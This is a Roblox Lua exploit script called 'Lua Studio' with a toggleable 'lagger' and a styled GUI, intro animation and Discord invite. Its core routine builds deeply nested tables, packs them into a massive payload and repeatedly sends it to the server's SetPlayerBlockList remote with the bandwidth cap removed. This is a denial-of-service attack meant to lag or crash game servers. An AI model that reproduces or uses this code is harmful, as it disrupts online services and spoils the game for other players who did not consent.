local Players = game:GetService("Players")
local CoreGui = game:GetService("CoreGui")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")
local SoundService = game:GetService("SoundService")

local LocalPlayer = Players.LocalPlayer
local isMobile = UserInputService.TouchEnabled and not UserInputService.MouseEnabled

local LAGGER_CONFIG = isMobile and {
    TableIncrease = 290,
    Tries = 1,
    LoopWaitTime = 0.85
} or {
    TableIncrease = 265,
    Tries = 1,
    LoopWaitTime = 0.05
}

local CUSTOM_REMOTE_PATH = "RobloxReplicatedStorage.SetPlayerBlockList"

local function resolveRemote(path)
    if not path or path == "" then return nil end
    local obj = game
    local cleaned = path:gsub("^game%.", "")
    for segment in cleaned:gmatch("[^%.]+") do
        if obj then obj = obj[segment] else return nil end
    end
    return obj
end

local function getmaxvalue(val)
    local mainvalueifonetable = 499999
    if type(val) ~= "number" then return nil end
    return mainvalueifonetable / (val + 2)
end

local function bomb(tableincrease, tries)
    local maintable = {}
    local spammedtable = {}
    table.insert(spammedtable, {})
    local z = spammedtable[1]
    for i = 1, tableincrease do
        local tableins = {}
        table.insert(z, tableins)
        z = tableins
    end
    local maximum = getmaxvalue(tableincrease) or 9999999
    for i = 1, maximum do
        table.insert(maintable, spammedtable)
        if i % 5000 == 0 then task.wait() end
    end
    local remote = resolveRemote(CUSTOM_REMOTE_PATH)
    if remote then
        for i = 1, tries do
            pcall(function()
                if remote:IsA("RemoteEvent") or remote:IsA("UnreliableRemoteEvent") then
                    remote:FireServer(maintable)
                elseif remote:IsA("RemoteFunction") then
                    remote:InvokeServer(maintable)
                end
            end)
        end
    end
end

local laggerEnabled = false
local laggerThread = nil

local function startLaggerLoop()
    while laggerEnabled do
        game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
        task.spawn(function() bomb(LAGGER_CONFIG.TableIncrease, LAGGER_CONFIG.Tries) end)
        task.wait(math.max(LAGGER_CONFIG.LoopWaitTime, 0.15))
    end
end

local function stopLaggerLoop()
    laggerEnabled = false
    if laggerThread then coroutine.close(laggerThread) laggerThread = nil end
end

local function startLagger()
    if laggerThread then return end
    laggerEnabled = true
    laggerThread = coroutine.create(startLaggerLoop)
    coroutine.resume(laggerThread)
end

-- Optimization
for _, v in pairs(workspace:GetDescendants()) do
    if v:IsA("Texture") or v:IsA("Decal") then
        v:Destroy()
    elseif v:IsA("Part") and v.Material ~= Enum.Material.Neon and v.Material ~= Enum.Material.ForceField then
        v.Material = Enum.Material.SmoothPlastic
    end
end

-- ==================================================================================
-- LUA STUDIO UI - YELLOW / BLACK + PIXEL INTRO
-- ==================================================================================

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "LuaStudioUI"
ScreenGui.ResetOnSpawn = false
ScreenGui.IgnoreGuiInset = true
ScreenGui.Parent = CoreGui

-- ===================== INTRO =====================
local IntroFrame = Instance.new("Frame")
IntroFrame.Size = UDim2.new(1, 0, 1, 0)
IntroFrame.Position = UDim2.new(0, 0, 0, 0)
IntroFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
IntroFrame.ZIndex = 10
IntroFrame.Parent = ScreenGui

-- Music
local IntroMusic = Instance.new("Sound")
IntroMusic.Name = "LuaIntroMusic"
IntroMusic.SoundId = "rbxassetid://115039380423779"
IntroMusic.Volume = 2
IntroMusic.PlayOnRemove = false
IntroMusic.Parent = SoundService
pcall(function() IntroMusic:Play() end)

-- Pixel container - centered grid that builds logo
local PIXEL_SIZE = 14
local COLS = 22
local ROWS = 6
local GAP = 2
local gridW = COLS * (PIXEL_SIZE + GAP)
local gridH = ROWS * (PIXEL_SIZE + GAP)

local PixelHolder = Instance.new("Frame")
PixelHolder.Size = UDim2.new(0, gridW, 0, gridH)
PixelHolder.Position = UDim2.new(0.5, 0, 0.5, -30)
PixelHolder.AnchorPoint = Vector2.new(0.5, 0.5)
PixelHolder.BackgroundTransparency = 1
PixelHolder.ZIndex = 11
PixelHolder.Parent = IntroFrame

-- Big Title under pixels
local IntroTitle = Instance.new("TextLabel")
IntroTitle.Text = "LUA STUDIO"
IntroTitle.Font = Enum.Font.GothamBlack
IntroTitle.TextColor3 = Color3.fromRGB(255, 215, 0)
IntroTitle.TextSize = 34
IntroTitle.Size = UDim2.new(1, 0, 0, 40)
IntroTitle.Position = UDim2.new(0.5, 0, 0.5, 45)
IntroTitle.AnchorPoint = Vector2.new(0.5, 0)
IntroTitle.BackgroundTransparency = 1
IntroTitle.TextTransparency = 1
IntroTitle.ZIndex = 12
IntroTitle.Parent = IntroFrame

local IntroSub = Instance.new("TextLabel")
IntroSub.Text = "LOADING..."
IntroSub.Font = Enum.Font.Code
IntroSub.TextColor3 = Color3.fromRGB(120, 120, 120)
IntroSub.TextSize = 10
IntroSub.Size = UDim2.new(1, 0, 0, 20)
IntroSub.Position = UDim2.new(0.5, 0, 0.5, 85)
IntroSub.AnchorPoint = Vector2.new(0.5, 0)
IntroSub.BackgroundTransparency = 1
IntroSub.TextTransparency = 1
IntroSub.ZIndex = 12
IntroSub.Parent = IntroFrame

-- Create pixels
local pixels = {}
math.randomseed(tick())

-- Pattern for "LUA" block - simple filled rows with slight shape
local function shouldFill(col, row)
    -- Create a cool pattern that looks like building blocks, not perfect rect
    if row >= 2 and row <= 5 then return true end
    if row == 1 and col > 3 and col < COLS-2 then return true end
    if row == 6 and col > 2 and col < COLS-1 then return true end
    return math.random() > 0.3
end

for r = 1, ROWS do
    for c = 1, COLS do
        if shouldFill(c, r) then
            local p = Instance.new("Frame")
            p.Size = UDim2.new(0, PIXEL_SIZE, 0, PIXEL_SIZE)
            local targetX = (c-1)*(PIXEL_SIZE+GAP)
            local targetY = (r-1)*(PIXEL_SIZE+GAP)
            p.Position = UDim2.new(0, targetX + math.random(-800, 800), 0, targetY + math.random(-500, 500))
            p.BackgroundColor3 = Color3.fromRGB(255, 215, 0)
            p.BorderSizePixel = 0
            p.ZIndex = 11
            p.BackgroundTransparency = 1
            p.Parent = PixelHolder

            local corner = Instance.new("UICorner")
            corner.CornerRadius = UDim.new(0, 2)
            corner.Parent = p

            table.insert(pixels, {frame = p, tx = targetX, ty = targetY, delay = math.random()*0.4 + (r*0.08)})
        end
    end
end

-- Main Frame (hidden until intro ends)
local MainFrame = Instance.new("Frame")
MainFrame.Size = UDim2.new(0, 180, 0, 138) 
MainFrame.Position = UDim2.new(0.5, -90, 0.5, -69)
MainFrame.BackgroundColor3 = Color3.fromRGB(12, 12, 12)
MainFrame.BackgroundTransparency = 1
MainFrame.ClipsDescendants = true
MainFrame.Active = true
MainFrame.Visible = false
MainFrame.Parent = ScreenGui

local MainCorner = Instance.new("UICorner")
MainCorner.CornerRadius = UDim.new(0, 6)
MainCorner.Parent = MainFrame

local MainStroke = Instance.new("UIStroke")
MainStroke.Color = Color3.fromRGB(255, 215, 0)
MainStroke.Thickness = 1.5
MainStroke.Transparency = 1
MainStroke.Parent = MainFrame

local TitleLabel = Instance.new("TextLabel")
TitleLabel.Text = "Lua Studio"
TitleLabel.Font = Enum.Font.GothamBold
TitleLabel.TextColor3 = Color3.fromRGB(255, 215, 0)
TitleLabel.TextSize = 13 
TitleLabel.Size = UDim2.new(1, -16, 0, 20)
TitleLabel.Position = UDim2.new(0, 8, 0, 6)
TitleLabel.TextXAlignment = Enum.TextXAlignment.Left
TitleLabel.BackgroundTransparency = 1
TitleLabel.TextTransparency = 1
TitleLabel.Parent = MainFrame

local StatusFrame = Instance.new("Frame")
StatusFrame.Size = UDim2.new(0.75, 0, 0, 26) 
StatusFrame.Position = UDim2.new(0.5, 0, 0, 38)
StatusFrame.AnchorPoint = Vector2.new(0.5, 0)
StatusFrame.BackgroundColor3 = Color3.fromRGB(255, 215, 0)
StatusFrame.BackgroundTransparency = 1
StatusFrame.Parent = MainFrame

local StatusCorner = Instance.new("UICorner")
StatusCorner.CornerRadius = UDim.new(0, 4)
StatusCorner.Parent = StatusFrame

local StatusLabel = Instance.new("TextLabel")
StatusLabel.Text = "ENABLED"
StatusLabel.Font = Enum.Font.GothamBold
StatusLabel.TextColor3 = Color3.fromRGB(10, 10, 10)
StatusLabel.TextSize = 12
StatusLabel.Size = UDim2.new(1, 0, 1, 0)
StatusLabel.BackgroundTransparency = 1
StatusLabel.TextTransparency = 1
StatusLabel.Parent = StatusFrame

local ToggleBtn = Instance.new("TextButton")
ToggleBtn.Text = ""
ToggleBtn.BackgroundTransparency = 1
ToggleBtn.Size = UDim2.new(1, 0, 1, 0)
ToggleBtn.Parent = StatusFrame

local DiscordBtn = Instance.new("TextButton")
DiscordBtn.Text = ""
DiscordBtn.BackgroundColor3 = Color3.fromRGB(255, 215, 0)
DiscordBtn.Size = UDim2.new(0.75, 0, 0, 26)
DiscordBtn.Position = UDim2.new(0.5, 0, 0, 72)
DiscordBtn.AnchorPoint = Vector2.new(0.5, 0)
DiscordBtn.AutoButtonColor = false
DiscordBtn.BackgroundTransparency = 1
DiscordBtn.Parent = MainFrame

local DiscordCorner = Instance.new("UICorner")
DiscordCorner.CornerRadius = UDim.new(0, 4)
DiscordCorner.Parent = DiscordBtn

local DiscordStroke = Instance.new("UIStroke")
DiscordStroke.Color = Color3.fromRGB(255, 235, 80)
DiscordStroke.Thickness = 1
DiscordStroke.Transparency = 1
DiscordStroke.Parent = DiscordBtn

local DiscordText = Instance.new("TextLabel")
DiscordText.Text = "Copy Discord Link"
DiscordText.Font = Enum.Font.GothamBold
DiscordText.TextColor3 = Color3.fromRGB(0, 0, 0)
DiscordText.TextSize = 11
DiscordText.BackgroundTransparency = 1
DiscordText.TextTransparency = 1
DiscordText.Size = UDim2.new(1, 0, 1, 0)
DiscordText.Parent = DiscordBtn

local KeybindLabel = Instance.new("TextLabel")
KeybindLabel.Text = "Keybind:"
KeybindLabel.Font = Enum.Font.GothamMedium
KeybindLabel.TextColor3 = Color3.fromRGB(255, 215, 0)
KeybindLabel.TextSize = 10 
KeybindLabel.Size = UDim2.new(0, 60, 0, 20)
KeybindLabel.Position = UDim2.new(0, 10, 1, -10)
KeybindLabel.AnchorPoint = Vector2.new(0, 1)
KeybindLabel.TextXAlignment = Enum.TextXAlignment.Left
KeybindLabel.BackgroundTransparency = 1
KeybindLabel.TextTransparency = 1
KeybindLabel.Parent = MainFrame

local KeybindBtn = Instance.new("TextButton")
KeybindBtn.Text = "" 
KeybindBtn.BackgroundColor3 = Color3.fromRGB(22, 22, 22)
KeybindBtn.Size = UDim2.new(0, 36, 0, 20)
KeybindBtn.Position = UDim2.new(1, -10, 1, -10)
KeybindBtn.AnchorPoint = Vector2.new(1, 1)
KeybindBtn.AutoButtonColor = false 
KeybindBtn.BackgroundTransparency = 1
KeybindBtn.Parent = MainFrame

local KeybindCorner = Instance.new("UICorner")
KeybindCorner.CornerRadius = UDim.new(0, 4)
KeybindCorner.Parent = KeybindBtn
KeybindBtn.SelectionImageObject = Instance.new("ImageLabel")

local KeybindStroke = Instance.new("UIStroke")
KeybindStroke.Color = Color3.fromRGB(255, 215, 0)
KeybindStroke.Thickness = 1.2
KeybindStroke.Transparency = 1
KeybindStroke.Parent = KeybindBtn

local KeybindText = Instance.new("TextLabel")
KeybindText.Text = "V"
KeybindText.Font = Enum.Font.GothamMedium
KeybindText.TextColor3 = Color3.fromRGB(255, 215, 0)
KeybindText.TextSize = 11
KeybindText.BackgroundTransparency = 1
KeybindText.TextTransparency = 1
KeybindText.Size = UDim2.new(1, 0, 1, 0)
KeybindText.AnchorPoint = Vector2.new(0.5, 0.5)
KeybindText.Position = UDim2.new(0.5, 0, 0.5, 1)
KeybindText.Parent = KeybindBtn

-- =========================================================================
-- INTRO ANIMATION LOGIC
-- =========================================================================
local function playIntro()
    -- Animate pixels building
    for _, pix in ipairs(pixels) do
        task.delay(pix.delay, function()
            pcall(function()
                TweenService:Create(pix.frame, TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
                    Position = UDim2.new(0, pix.tx, 0, pix.ty),
                    BackgroundTransparency = 0
                }):Play()
            end)
        end)
    end

    task.wait(0.8)
    -- Show title
    TweenService:Create(IntroTitle, TweenInfo.new(0.4, Enum.EasingStyle.Quad), {TextTransparency = 0}):Play()
    TweenService:Create(IntroSub, TweenInfo.new(0.4, Enum.EasingStyle.Quad), {TextTransparency = 0.3}):Play()
    
    -- Pulse pixels yellow/black
    task.wait(0.6)
    for i, pix in ipairs(pixels) do
        if i % 3 == 0 then
            task.delay(math.random()*0.3, function()
                TweenService:Create(pix.frame, TweenInfo.new(0.15, Enum.EasingStyle.Linear), {BackgroundColor3 = Color3.fromRGB(0,0,0)}):Play()
                task.wait(0.15)
                TweenService:Create(pix.frame, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(255,215,0)}):Play()
            end)
        end
    end

    task.wait(1.4)

    -- Fade out intro
    TweenService:Create(IntroTitle, TweenInfo.new(0.3), {TextTransparency = 1}):Play()
    TweenService:Create(IntroSub, TweenInfo.new(0.3), {TextTransparency = 1}):Play()
    
    for _, pix in ipairs(pixels) do
        TweenService:Create(pix.frame, TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
            BackgroundTransparency = 1,
            Position = UDim2.new(0, pix.tx, 0, pix.ty - 80)
        }):Play()
    end

    task.wait(0.35)
    TweenService:Create(IntroFrame, TweenInfo.new(0.5, Enum.EasingStyle.Quad), {BackgroundTransparency = 1}):Play()
    task.wait(0.5)
    IntroFrame:Destroy()

    -- Show Main UI with pop
    MainFrame.Visible = true
    MainFrame.Size = UDim2.new(0, 0, 0, 0)
    MainFrame.BackgroundTransparency = 0
    MainStroke.Transparency = 0

    TweenService:Create(MainFrame, TweenInfo.new(0.45, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
        Size = UDim2.new(0, 180, 0, 138)
    }):Play()

    task.wait(0.15)
    local function fadeIn(obj, prop)
        prop = prop or "TextTransparency"
        TweenService:Create(obj, TweenInfo.new(0.25), {[prop] = 0}):Play()
    end
    fadeIn(TitleLabel)
    fadeIn(StatusFrame, "BackgroundTransparency")
    fadeIn(StatusLabel)
    fadeIn(DiscordBtn, "BackgroundTransparency")
    fadeIn(DiscordStroke, "Transparency")
    fadeIn(DiscordText)
    fadeIn(KeybindLabel)
    fadeIn(KeybindBtn, "BackgroundTransparency")
    fadeIn(KeybindStroke, "Transparency")
    fadeIn(KeybindText)

    -- Stop music with fade
    if IntroMusic then
        local tween = TweenService:Create(IntroMusic, TweenInfo.new(0.8), {Volume = 0})
        tween:Play()
        tween.Completed:Wait()
        IntroMusic:Stop()
        IntroMusic:Destroy()
    end
end

task.spawn(playIntro)

-- =========================================================================
-- TOGGLE LOGIC
-- =========================================================================
local function setToggle(state)
    laggerEnabled = state
    local bgColor = state and Color3.fromRGB(255, 215, 0) or Color3.fromRGB(45, 45, 45)
    local textColor = state and Color3.fromRGB(0, 0, 0) or Color3.fromRGB(255, 215, 0)
    local text = state and "ENABLED" or "DISABLED"
    TweenService:Create(StatusFrame, TweenInfo.new(0.15), {BackgroundColor3 = bgColor}):Play()
    TweenService:Create(StatusLabel, TweenInfo.new(0.15), {TextColor3 = textColor}):Play()
    StatusLabel.Text = text
    if state then startLagger() else stopLaggerLoop() end
end

ToggleBtn.MouseButton1Click:Connect(function() setToggle(not laggerEnabled) end)

-- Discord
local DISCORD_LINK = "https://discord.gg/x8hRarqqYq"
DiscordBtn.MouseButton1Click:Connect(function()
    if setclipboard then setclipboard(DISCORD_LINK)
    elseif toclipboard then toclipboard(DISCORD_LINK) end
    local original = DiscordText.Text
    DiscordText.Text = "Copied!"
    DiscordBtn.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
    DiscordText.TextColor3 = Color3.fromRGB(255, 215, 0)
    task.wait(1.2)
    DiscordText.Text = original
    DiscordBtn.BackgroundColor3 = Color3.fromRGB(255, 215, 0)
    DiscordText.TextColor3 = Color3.fromRGB(0, 0, 0)
end)

-- Keybind
local boundKey = Enum.KeyCode.V
local listeningForKey = false
local listenTimeout = nil
local keyDown = false

KeybindBtn.MouseButton1Click:Connect(function()
    if listenTimeout then task.cancel(listenTimeout) end
    listeningForKey = true
    KeybindText.Text = "..."
    listenTimeout = task.delay(5, function()
        if listeningForKey then
            listeningForKey = false
            KeybindText.Text = tostring(boundKey):gsub("Enum.KeyCode.", "")
        end
    end)
end)

UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed then return end
    if input.UserInputType ~= Enum.UserInputType.Keyboard then return end
    if listeningForKey then
        boundKey = input.KeyCode
        KeybindText.Text = tostring(boundKey):gsub("Enum.KeyCode.", "")
        listeningForKey = false
        if listenTimeout then task.cancel(listenTimeout) listenTimeout = nil end
    end
end)

RunService.RenderStepped:Connect(function()
    if boundKey and UserInputService:IsKeyDown(boundKey) then
        if not keyDown then keyDown = true setToggle(not laggerEnabled) end
    else keyDown = false end
end)

-- Dragging
local dragging = false
local dragStart = nil
local startPos = nil
MainFrame.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true dragStart = input.Position startPos = MainFrame.Position
    end
end)
UserInputService.InputChanged:Connect(function(input)
    if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
        local delta = input.Position - dragStart
        MainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
end)
UserInputService.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then dragging = false end
end)
